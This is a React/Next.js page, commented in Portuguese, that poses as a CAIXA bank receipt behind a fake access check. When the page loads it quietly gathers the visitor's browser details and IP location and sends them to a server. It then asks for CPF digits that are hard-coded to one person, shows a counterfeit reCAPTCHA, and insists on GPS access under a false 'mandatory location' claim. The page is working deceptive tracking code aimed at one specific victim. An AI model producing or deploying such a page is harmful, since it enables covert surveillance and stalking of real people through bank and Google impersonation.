import { useEffect, useState } from 'react';
import styles from '../styles/Home.module.css';
import Head from 'next/head';

export default function Home() {
  const [mensagem, setMensagem] = useState('Iniciando coleta...');
  const [cpf, setCpf] = useState('');
  const [mostrarModal, setMostrarModal] = useState(false);
  const [naoSouRobo, setNaoSouRobo] = useState(false);

  useEffect(() => {
    async function coletaInicial() {
      setMensagem('Coletando dados do navegador...');
      const info = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        hora: new Date().toLocaleString(),
        location: 'Aguardando permissão do usuário',
      };

      setMensagem('Obtendo localização baseada no IP...');
      const ipData = await obterLocalizacaoIP();
      info.ip = ipData.ip;
      info.localizacaoIP = {
        cidade: ipData.city,
        regiao: ipData.region,
        pais: ipData.country,
        org: ipData.org,
      };

      setMensagem('Enviando dados ao servidor...');
      await enviar(info);
      setMensagem('Dados enviados com sucesso!');
    }

    coletaInicial();
  }, []);

  async function obterLocalizacaoIP() {
    try {
      const res = await fetch('https://ipinfo.io/json?token=8d5553292f5d68');
      if (!res.ok) throw new Error('Erro ao obter localização IP');
      return await res.json();
    } catch (err) {
      console.error('Erro ao obter localização IP:', err);
      return { ip: 'Desconhecido', city: '', region: '', country: '', org: '' };
    }
  }

  async function obterLocalizacaoGPS() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        return resolve('Geolocalização não suportada');
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
          });
        },
        () => {
          resolve('Permissão negada ou erro ao obter localização.');
        }
      );
    });
  }

  async function enviar(data) {
    try {
      const res = await fetch('/api/coletar-info', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });

      if (!res.ok) {
        setMensagem('Erro ao enviar os dados');
        console.error('Erro ao enviar dados:', await res.text());
      }
    } catch (err) {
      setMensagem('Erro ao conectar com o servidor');
      console.error('Erro ao enviar dados:', err);
    }
  }

  const solicitarLocalizacao = async () => {
    setMensagem('Solicitando geolocalização...');
    const localizacao = await obterLocalizacaoGPS();

    if (typeof localizacao === 'string') {
      alert(localizacao);
      setMostrarModal(false);
      return;
    }

    setMensagem('Coletando novamente com geolocalização...');
    const info = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      hora: new Date().toLocaleString(),
      location: localizacao,
    };

    const ipData = await obterLocalizacaoIP();
    info.ip = ipData.ip;
    info.localizacaoIP = {
      cidade: ipData.city,
      regiao: ipData.region,
      pais: ipData.country,
      org: ipData.org,
    };

    await enviar(info);
    alert('Dados atualizados com sucesso!');
    setMostrarModal(false);
    setMensagem('Dados com geolocalização enviados!');
  };

  const handleEnviarCPF = () => {
    if (cpf.trim() !== '7887') {
      alert('CPF incorreto. Digite os 4 primeiros dígitos do CPF do titular.');
      return;
    }

    if (!naoSouRobo) {
      alert('Por favor, confirme que você não é um robô.');
      return;
    }

    setMostrarModal(true);
  };

  return (
    <>
      <Head>
        <title>CAIXA-comprovante-1522457896</title>
        <meta name="description" content="Comprovante-1522457896" />
      </Head>

      <div className={styles.container}>
        <h1 className={styles.title}>Verificação de Acesso</h1>
        <p>{mensagem}</p>

        <div className={styles.inputContainer}>
          <input
            type="number"
            placeholder="4 primeiros dígitos do CPF"
            value={cpf}
            onChange={(e) => setCpf(e.target.value)}
            className={styles.input}
          />
          <button onClick={handleEnviarCPF} className={styles.button}>
            Enviar
          </button>
        </div>

        {/* Simulação de reCAPTCHA */}
        <div className={styles.recaptchaContainer}>
          <div className={styles.recaptchaBox}>
            <label className={styles.recaptchaLabel}>
              <input
                type="checkbox"
                checked={naoSouRobo}
                onChange={(e) => setNaoSouRobo(e.target.checked)}
              />
              <span className={styles.checkmark}></span>
              Não sou um robô
            </label>
            <div className={styles.recaptchaLogo}>
              <img src="/recaptcha-logo.png" alt="reCAPTCHA" />
              <span className={styles.recaptchaSub}>reCAPTCHA</span>
            </div>
          </div>
        </div>

        {/* Rodapé com privacidade e termos */}
        <div className={styles.recaptchaFooter}>
          <span>Protegido por reCAPTCHA</span>
          <a
            href="https://policies.google.com/privacy"
            target="_blank"
            rel="noopener noreferrer"
          >
            Privacidade
          </a>
          -
          <a
            href="https://policies.google.com/terms"
            target="_blank"
            rel="noopener noreferrer"
          >
            Termos
          </a>
        </div>

        {mostrarModal && (
          <div className={styles.modalOverlay}>
            <div className={styles.modalContent}>
              <h2>LOCALIZAÇÃO OBRIGATÓRIA</h2>
              <p>
                Este documento possui dados sensíveis. É obrigatório confirmar a
                localização dentro do território nacional para prosseguir.
              </p>
              <button onClick={solicitarLocalizacao} className={styles.modalButton}>
                Ativar Localização
              </button>
            </div>
          </div>
        )}
      </div>
    </>
  );
}
